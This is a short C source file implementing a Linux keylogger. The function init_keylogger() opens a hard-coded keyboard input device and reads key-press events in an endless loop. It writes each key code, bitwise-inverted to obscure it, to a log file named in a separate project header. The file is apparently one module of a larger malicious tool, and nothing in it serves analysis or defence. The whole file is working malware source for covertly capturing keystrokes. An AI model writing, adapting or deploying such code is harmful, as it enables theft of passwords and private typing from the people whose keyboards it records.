#include <stdio.h>
#include <fcntl.h>
#include <linux/input.h>
#include <unistd.h>

#include "../include/types.h"

#define UAM_KEYBOARD "/dev/input/event5"

int init_keylogger()
{
	size_t rb;
	struct input_event ev[64];
	int i;
	int keybrdToCapture;
	char path[] = UAM_KEYBOARD;
	FILE *file;

	if ((keybrdToCapture = open(path, O_RDONLY)) == -1)
	{
#ifdef DEBUG
		printf("Error opening device\n");
#endif
		return ERROR;
	}

	while (1)
	{
		rb = read(keybrdToCapture, ev, sizeof(struct input_event) * 64);

		for (i = 0; i < (int)(rb / sizeof(struct input_event)); i++)
		{
			file = fopen(BL, "ab+");
			if (!file)
			{
#ifdef DEBUG
				printf(P_ERROR"No file?\n");
#endif
				return ERROR;
			}

			if (EV_KEY == ev[i].type && ev[i].value == 1)
			{
				fputc(~ev[i].code, file);
			}

			fclose(file);
		}
	}

	return OK;
}
